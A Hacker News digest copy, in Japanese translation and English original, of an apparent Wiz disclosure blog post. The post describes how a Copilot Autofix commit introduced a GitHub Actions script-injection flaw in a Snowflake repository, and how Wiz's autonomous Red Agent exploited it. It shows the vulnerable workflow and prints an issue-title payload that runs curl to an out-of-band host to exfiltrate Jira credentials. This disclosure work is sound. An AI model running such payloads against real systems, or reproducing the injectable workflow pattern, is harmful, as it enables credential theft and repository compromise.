---
source: "https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug"
hn_url: "https://news.ycombinator.com/item?id=49331423"
title: "AI-Generated GitHub Copilot \"Autofix\" Allowed Compromise of Snowflake's Jira"
article_title: "How Copilot Created & Red Agent Found a CI/CD Bug | Wiz Blog"
image: "https://www.datocms-assets.com/75231/1786964856-image.png?fm=webp"
author: "galnagli"
captured_at: "2026-08-17T15:17:00Z"
capture_tool: "hn-digest"
hn_id: 49331423
score: 37
comments: 14
posted_at: "2026-08-17T14:18:38Z"
tags:
  - hacker-news
  - translated
---

# AI-Generated GitHub Copilot "Autofix" Allowed Compromise of Snowflake's Jira

- HN: [49331423](https://news.ycombinator.com/item?id=49331423)
- Source: [www.wiz.io](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug)
- Score: 37
- Comments: 14
- Posted: 2026-08-17T14:18:38Z

## Translation

タイトル: AI が生成した GitHub コパイロット「Autofix」により Snowflake の Jira が侵害される
記事のタイトル: Copilot の作成方法と Red Agent が CI/CD バグを発見した方法 |ウィズのブログ
説明: パブリック Snowflake リポジトリにある AI 生成の修正により、ワークフロー インジェクションの欠陥が導入されました。これは Wiz Red Agent によって数日で発見されました。研究分析の全文をお読みください。

記事本文:
デモを取得する ブログ Wiz Red エージェントが AI 生成の GitHub コパイロット「Autofix」により Snowflake の内部 Jira への侵入を発見
Wiz Red Agent は、GitHub Copilot Autofix によって導入された GitHub Actions の脆弱性を独自に発見して悪用し、Snowflake の内部 Jira 内の機密データへのアクセスを検証し、爆発範囲を評価しました。これらはすべて人間の介入なしで行われました。
2026 年 8 月 17 日 | Snowflake の HackerOne 脆弱性公開プログラムを通じて実施されている継続的なセキュリティ調査の一環として、Wiz Research の AI を活用した自律型セキュリティ調査ツールである「Red Agent」は、Snowflake のパブリック リポジトリの 1 つで GitHub Actions ワークフローの重大な脆弱性を特定しました。
このインシデントは、AI コーディング アシスタントがどのようにしてワークフロー インジェクションの脆弱性を不用意に持ち込む可能性があるか、そして自動化された AI エージェントがどのようにしてその脆弱性を迅速に表面化させるのかという、ソフトウェア開発において急速に浮上している現実を浮き彫りにしています。
2026 年 6 月 23 日に Wiz が責任ある開示を行うと、Snowflake は同日に脆弱性を修復し、影響を受けた認証情報をローテーションし、詳細な監査ログを通じて、Wiz が暴露期間中の唯一の攻撃者であったことを確認しました。ウィズは、概念実証テスト中にアクセスされたすべてのデータが安全に削除されたことを確認しました。
Wiz Red Agent は、 Snowflakedb/snowflake-connector-net にスクリプト インジェクションの脆弱性を特定しました。この問題により、認証されていないユーザーが、特別に細工されたタイトルで GitHub の課題を開くことにより、GitHub Actions ランナー内で任意のコマンドを実行することが可能になってしまいました。
重要なのは、この脆弱性は、Copilot Autofix powered by AI (PR #1218) が共同作成したコミットを通じて、発見のわずか 5 日前である 2026 年 6 月 18 日に導入されました。 AI アシスタントはリポジトリの既存のサニタイズされた入力パターンを削除し、それを d に置き換えました。

シェルスクリプトでの文字列展開を直接実行します。
Wiz Red Agent の CI/CD 機能は、Snowflake の GitHub 組織をスキャンし、snowflakedb/snowflake-connector-net の jira_issue.yml ワークフローに、run: ブロックの信頼できない入力によるスクリプト インジェクションに対して脆弱であるとフラグを立てました。
AI アシスタント (Github Copilot) の変更
- 環境:
- ISSUE_TITLE : ${{ github.event.issue.title }}
- 実行: jq -n --arg title "$ISSUE_TITLE" ...
+ run : TITLE=$(echo '${{ github.event.issue.title }}' | sed ...) 問題でトリガーされるワークフロー: オープン - GitHub ユーザーが問題を開いて起動できることを意味します - 攻撃者が制御する問題のタイトルをシェル スクリプトに直接挿入します。
実行: | TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") sed エスケープは GitHub のテンプレート展開後に実行され、タイトルの一重引用符が echo '...' を区切って任意のコマンドの実行を許可します。
この注入可能なパターンは、その数日前、2026 年 6 月 18 日にコミット 4a1b8ce (PR #1218: “SNOW-2069227: Update jira workflows”) で導入されました。これは Copilot Autofix powered by AI によって共同作成されました。
これにより、リポジトリの既存の安全なパターンが削除され、 env: 変数を介して問題のタイトルが渡され、 jq を使用して JSON ペイロードが構築されました。代わりに、上記の直接 ${{ github.event.issue.title }} 補間を使用しました。言い換えれば、AI の「自動修正」コミットがまさに注入ベクトルを作成したということです。
ワークフローには、保護的に見える if: 条件がありました。
if : (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]') ただし、issue イベントでは、github.event.pull_request は常に null です。
したがって、条件は ( null != 'whitesource-for-github-com[bot]' ) になります。これは常に当てはまり、すべての GitHub ユーザーがその門を通過します。
私たちは問題を作成しました

テンプレートの展開後に、エコー文字列を突破し、アウトオブバンド コールバックを介して Jira 認証情報を抽出するファイル:
重要なのは、Red Agent の cicd 機能が最初に標準のコメント文字 ( # ) を使用して抽出を試みたとき、コメントが TITLE=$(...) の閉じ括弧を消費していたため、ランナーは bash 構文エラーを返しました。 Red Agent は、停止したり失敗したりするのではなく、次のことを行います。
構文実行エラーを自律的に分析しました
使用するペイロードを調整しました。 echo ' を使用してシェル ブロックを適切に閉じます。
帯域外コールバックを正常に受信しました
' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo ' 数秒以内に、リスナーは、base64 でエンコードされた資格情報を含むコールバックを GitHub Actions ランナー (Azure IP 20.106.182.197 ) から受信しました。
注: 最初の試みでは、行の残りの部分をコメントアウトするために # を使用しました。これにより、 TITLE=$(...) の終了 ) も食われたため、予期しない EOF bash エラーが発生しました。修正には;を使用していました。 echo ' を使用してシェル構文を適切に閉じます。
抽出されたトークンは、 qa@snowflake.net として Snowflakecomputing.atlassian.net に対して認証され、Snowflake のエンジニアリング、セキュリティ コンプライアンス、およびバグ報奨金追跡プロジェクト全体にわたる読み取りアクセスを許可しました。
同日パッチ適用: Snowflake は 2026 年 6 月 23 日にワークフローにパッチを適用し ( 1dc7766 、 PR #1402)、安全な env: 変数と jq --arg 解析パターンを完全に復元しました。
資格情報の取り消し: 問題の JIRA トークンは取り消され、ローテーションされました。
フォレンジック検証: 包括的な監査ログ分析により、5 日間の暴露期間中に外部の第三者がエンドポイントにアクセスしていないことが確認されました。すべての異常なクエリは、Wiz のテスト IP と厳密に照合されました。
AI コード生成

厳格な監視が必要: AI コーディング ツールは確率的パターンに基づいてコードを予測するため、非推奨または安全でないシェル パターンが誤って再導入される可能性があります。 AI によって生成された PR は、人間のコードと同じ静的分析とセキュリティの精査を受ける必要があります。
検出ウィンドウの崩壊: この脆弱性は、自動エージェントが検出して検証するまで、わずか 5 日間存在していました。セキュリティ運用は、自動検出が数時間で行われる環境に適応する必要があり、迅速なパッチ サイクルと有効期間の短い認証情報が必要になります。
AI セキュリティの後退の防止: 自動化された AI アシスタントには、特定のコード パターンが選択された理由に関する歴史的背景が欠けていることがよくあります。このインシデントでは、自動化された PR によって、シェル インジェクションを防ぐために明示的に実装されていた安全な env: + jq 解析パターンが削除されました。セキュリティ チームは、AI エージェントが構造化データ パーサーを直接文字列補間に置き換えることをブロックするガードレールを実装する必要があります。
2026 年 6 月 18 日 - AI を利用した Copilot Autofix によって共同作成された、コミット 4a1b8ce (PR #1218) によって jira_issue.yml に導入されたスクリプトインジェクション パターン
2026 年 6 月 23 日 - Wiz が HackerOne 経由で Snowflake の脆弱性を特定、悪用、報告しました (レポート #3819931)
2026 年 6 月 23 日 - Slack 通知が Snowflake セキュリティ チームに送信されました
2026 年 6 月 23 日 (同日) - Snowflake は、脆弱なスクリプトインジェクション ワークフロー ( commit 1dc7766 、 PR #1402 ) にパッチを適用し、安全な env: + jq --arg パターンを復元しました。
2026 年 6 月 24 日 - Jira トークンがローテーションされました
2026 年 7 月 25 日 - 公開期限 (Snowflake の開示ポリシーに従って、6 月 25 日の決議から 30 日後)
Snowflake は、脆弱性開示およびバグ報奨金プログラムである HackerOne を通じて、Wiz が責任を持ってこれらの調査結果を報告し、協力してくれたことに感謝しています。 Wiz Research がセキュリティ上の脆弱性を報告しました

Snowflake のパブリック GitHub リポジトリの 1 つにあります。この開示は 2026 年 6 月 23 日に受領され、直ちに調査および修復されましたが、当社の調査では不正アクセスの証拠は見つかりませんでした。システムの保護は引き続き最優先事項であり、ソフトウェア開発とセキュリティの実践を継続的に強化することに引き続き取り組んでいます。私たちは Wiz と協力して、これらの学んだことをより広範な業界と共有し、これらのセキュリティのベスト プラクティスの広範な採用を促進しています。
タグ # 研究 # AI # Wiz エージェント 目次 概要
暴露ウォークスルーの発見
重要なポイントの開示タイムライン
私たちは実際のクラウド環境からのデータを活用して、AI テクノロジーの急速な導入とセキュリティ チームがどのように対応すべきかを調査します。
Wiz を使用したクローズド ループ修復プレイブック
Wiz Workflows が一般提供され、修復と対応がパブリック プレビューで開始され、今すぐ自己修復クラウドへの道を始めましょう。
Wiz on Wiz: Wiz FinOps チームによる Wiz Cloud コストの使用方法
深いクラウド コンテキストを使用してコストの調査と最適化を強化
AI はデータ リスクをめぐる状況を変化させており、何が接続されているのか、何が公開されているのか、そしてその理由を理解することが重要になっています。
「これまで見た中で最高のユーザー エクスペリエンスにより、クラウド ワークロードを完全に可視化できます。」
David Estlick CISO 「Wiz は、クラウド環境で何が起こっているかを確認するための単一画面を提供します。」
アダム・フレッチャー最高セキュリティ責任者「Wiz が何かを重要なものと判断した場合、それが実際に重要であることはわかっています。」
Greg Poniatowski 脅威および脆弱性管理責任者 デモを入手する フッター
ステータス プライバシー ポリシー 利用規約 現代の奴隷制度に関する声明 Cookie の設定

## Original Extract

An AI-generated fix in a public Snowflake repo introduced a workflow injection flaw—discovered in days by Wiz Red Agent. Read the full research analysis.

Get a demo Blog Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Due to an AI-Generated GitHub Copilot “Autofix”
Wiz Red Agent independently discovered and exploited a GitHub Actions vulnerability introduced by GitHub Copilot Autofix, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention.
August 17, 2026 | As part of ongoing security research conducted through Snowflake’s HackerOne vulnerability disclosure program, Wiz Research’s "Red Agent"—an autonomous, AI-powered security research tool—identified a critical GitHub Actions workflow vulnerability in one of Snowflake’s public repositories.
This incident highlights a rapidly emerging reality in software development: how AI coding assistants can inadvertently introduce workflow injection vulnerabilities, and how automated AI agents can rapidly surface them in the wild.
Upon responsible disclosure on June 23, 2026 by Wiz, Snowflake remediated the vulnerability on the same day, rotated the affected credential, and verified via detailed audit logs that Wiz was the sole actor during the exposure window. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.
Wiz Red Agent identified a script injection vulnerability in snowflakedb/snowflake-connector-net . The issue allowed an unauthenticated user to execute arbitrary commands within a GitHub Actions runner by opening a GitHub issue with a specially crafted title.
Crucially, the vulnerability was introduced on June 18, 2026—just five days prior to discovery—via a commit co-authored by Copilot Autofix powered by AI ( PR #1218 ). The AI assistant removed the repository's existing sanitized input pattern and replaced it with direct string expansion in a shell script.
Wiz Red Agent's CI/CD capability scanned Snowflake's GitHub organization and flagged the jira_issue.yml Workflow in snowflakedb/snowflake-connector-net as vulnerable to script injection via untrusted input in run: blocks.
AI Assistant (Github Copilot) Change
- env :
- ISSUE_TITLE : ${{ github.event.issue.title }}
- run : jq -n --arg title "$ISSUE_TITLE" ...
+ run : TITLE=$(echo '${{ github.event.issue.title }}' | sed ...) The workflow triggered on issues: opened - meaning any GitHub user could fire it by opening an issue - and interpolated the attacker-controlled issue title directly into a shell script:
run : | TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") The sed escaping runs after GitHub's template expansion, a single quote in the title breaks out of echo '...' and allows arbitrary command execution.
The injectable pattern was introduced just days earlier, on June 18, 2026, commit 4a1b8ce ( PR #1218: “SNOW-2069227: Update jira workflows” ) - co-authored by Copilot Autofix powered by AI .
It removed the repository’s existing safe pattern, which passed the issue title through an env: variable and built the JSON payload with jq . Instead it used the direct ${{ github.event.issue.title }} interpolation shown above. In other words, an AI “autofix” commit created the very injection vector.
The workflow had an if: condition that appeared protective:
if : (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]') However, on issues events, github.event.pull_request is always null .
So the condition reduces to ( null != 'whitesource-for-github-com[bot]' ). This is always true, and every GitHub user passes the gate.
We crafted an issue title that, after template expansion, breaks out of the echo string and exfiltrates the Jira credentials via an out-of-band callback:
Crucially, when Red Agent’s cicd capability initially attempted exfiltration using a standard comment character ( # ), the runner returned a bash syntax error because the comment consumed the closing parenthetical of TITLE=$(...) . Rather than stopping or failing, Red Agent:
autonomously analyzed the syntax execution error
adjusted its payload to use ; echo ' to properly close the shell block, and
successfully received the out-of-band callback
' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo ' Within seconds, our listener received the callback from a GitHub Actions runner (Azure IP 20.106.182.197 ) containing base64-encoded credentials.
Note: Our first attempt used # to comment out the rest of the line, which caused an unexpected EOF bash error because it also ate the closing ) of TITLE=$(...) . The fix was using ; echo ' to properly close the shell syntax.
The exfiltrated token authenticated as qa@snowflake.net to snowflakecomputing.atlassian.net , granting read access across Snowflake's engineering, security compliance, and bug bounty tracking projects.
Same-Day Patching: Snowflake patched the workflow on June 23, 2026 ( 1dc7766 , PR #1402), fully restoring the safe env: variable and jq --arg parsing pattern.
Credential Revocation: The JIRA token in question was revoked and rotated.
Forensic Verification: Comprehensive audit log analysis confirmed that no external third parties accessed the endpoint during the 5-day exposure window. All anomalous queries were strictly matched to Wiz's testing IPs.
AI Code Generation Demands Rigorous Oversight: AI coding tools predict code based on probabilistic patterns, which can inadvertently reintroduce deprecated or insecure shell patterns. AI-generated PRs must undergo the same static analysis and security scrutiny as human code.
Collapsing Discovery Windows: The vulnerability was live for only five days before an automated agent discovered and validated it. Security operations must adapt to a landscape where automated discovery occurs in hours, requiring rapid patch cycles and short-lived credentials.
Preventing AI Security Regressions: Automated AI assistants often lack historical context regarding why specific code patterns were chosen. In this incident, an automated PR removed a safe env: + jq parsing pattern that had been explicitly implemented to prevent shell injection. Security teams must implement Guardrails that block AI agents from replacing structured data parsers with direct string interpolation.
June 18, 2026 - Script-injection pattern introduced in jira_issue.yml by commit 4a1b8ce (PR #1218), co-authored by Copilot Autofix powered by AI
June 23, 2026 - Wiz identified, exploited, and reported vulnerability to Snowflake via HackerOne (report #3819931)
June 23, 2026 - Slack notification sent to Snowflake security team
June 23, 2026 (same day) - Snowflake patches the vulnerable script-injection workflow ( commit 1dc7766 , PR #1402 ), restoring the safe env: + jq --arg pattern.
June 24, 2026 - Jira token rotated
July 25, 2026 - Public disclosure deadline (30 days after the June 25 resolution, per Snowflake’s disclosure policy)
Snowflake appreciates Wiz's responsible reporting of and collaboration around these findings through our vulnerability disclosure and bug bounty program, HackerOne. Wiz Research reported a security vulnerability in one of Snowflake's public GitHub repositories. The disclosure was received on June 23, 2026, and it was immediately investigated and remediated, and our investigation found no evidence of unauthorized access. Protecting our systems remains a top priority, and we remain committed to continually strengthening our software development and security practices. We are working together with Wiz to share these learnings with the broader industry to encourage widespread adoption of these security best practices.
Tags # Research # AI # Wiz Agents Table of contents Executive Summary
Exposure Walk-Through Discovery
Key Takeaways Disclosure Timeline
We tap into data from real cloud environments to explore the rapid adoption of AI technologies and how security teams should respond.
The Closed Loop Remediation Playbook with Wiz
Start your path to a self-healing cloud today, with Wiz Workflows now GA and Remediation and Response in public preview.
Wiz on Wiz: How the Wiz FinOps Team Uses Wiz Cloud Cost
Powering cost investigation and optimization with deep cloud context
AI is changing the context around data risk, making it critical to understand what’s connected, what’s exposed, and why.
"Best User Experience I have ever seen, provides full visibility to cloud workloads."
David Estlick CISO "Wiz provides a single pane of glass to see what is going on in our cloud environments."
Adam Fletcher Chief Security Officer "We know that if Wiz identifies something as critical, it actually is."
Greg Poniatowski Head of Threat and Vulnerability Management Get a demo Footer
Status Privacy Policy Terms of Use Modern Slavery Statement Cookie Settings
